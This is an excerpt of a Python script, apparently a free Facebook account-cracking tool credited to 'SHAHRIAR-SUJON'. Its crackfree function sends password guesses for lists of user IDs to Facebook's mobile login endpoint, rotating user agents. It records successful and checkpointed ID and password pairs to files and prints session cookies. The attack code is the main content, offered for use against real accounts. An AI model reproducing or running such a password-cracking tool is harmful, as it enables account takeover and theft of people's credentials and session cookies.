...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mSHAHRIAR-SUJON ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • SHAHRIAR SUJON ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mNOOB-SUJON ]   ║\33[1;34m    
╠══[TOOLS                    • FREE ]         ║ \33[1;32m   
...
os.system('espeak -a 300 " Welcome,   to,  Noob,  Sujon,  Tools"')
pass
...
def menu():
    ...
    if SUJON in ['1']:
        crack_file()
    if SUJON in ['2','02']:
        os.system('xdg-open https://wa.me/+8801304061855')
        os.system("python nono.py")
    if SUJON in ['3','03']:
        result()
    if SUJON in ['0']:
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Sujon-Cp] {idf} • {pw}')
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;92m[SUJON-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Sujon,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Sujon-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Sujon-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Sujon-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Sujon, Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
